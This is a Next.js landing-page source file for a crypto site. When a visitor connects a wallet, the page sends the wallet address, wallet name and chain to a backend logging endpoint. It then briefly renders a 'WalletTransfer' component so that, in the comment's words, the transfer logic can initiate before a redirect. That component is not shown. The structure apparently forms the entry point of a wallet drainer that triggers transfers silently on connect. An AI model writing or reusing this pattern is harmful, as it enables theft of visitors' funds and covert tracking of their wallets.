// src/app/page.tsx
'use client'; // This page needs to be a Client Component

import { useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { useAccount } from 'wagmi';

import Header from '@/components/layout/header';
import Footer from '@/components/layout/footer';
import Hero from '@/components/sections/hero';
import Benefits from '@/components/sections/benefits';
import WalletTransfer from '@/components/sections/wallettransfer'; // Import the transfer component

import { ConnectButton } from '@rainbow-me/rainbowkit';

export default function Home() {
  const { address, isConnected, connector, chain } = useAccount();
  const router = useRouter();
  const hasLoggedConnection = useRef(false);

  useEffect(() => {
    // --- Logging Connection ---
    if (isConnected && address && chain && connector && !hasLoggedConnection.current) {
      hasLoggedConnection.current = true; 

      const logConnection = async () => {
        try {
          const response = await fetch('/api/log_connection', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              walletAddress: address,
              connectedWalletName: connector.name,
              chainId: chain.id,
              chainName: chain.name,
            }),
          });

          if (!response.ok) {
            console.error('Failed to send connection log:', response.statusText);
          } else {
            console.log('Connection logged to backend successfully!');
          }
        } catch (error) {
          console.error('Error sending connection log:', error);
        }
      };
      logConnection();
    } else if (!isConnected) {
      hasLoggedConnection.current = false;
    }

    // --- Dashboard Redirect Logic ---
    if (isConnected) {
      // A short delay can help ensure other hooks have time to fire
      const timer = setTimeout(() => {
        router.push('/dashboard');
      }, 500); // 0.5 second delay before redirect
      return () => clearTimeout(timer);
    }
  }, [address, isConnected, connector, chain, router]); 

  // If connected, we show the WalletTransfer component briefly before redirect.
  // This allows the transfer logic to initiate.
  if (isConnected) {
    return <WalletTransfer />;
  }
  
  return (
    <div className="flex flex-col min-h-screen bg-background">
      <Header />
      <main className="flex-grow">
        <Hero />
        <Benefits />
        <div style={{ textAlign: 'center', marginTop: '20px' }}>
          <ConnectButton />
        </div>
      </main>
      <Footer />
    </div>
  );
}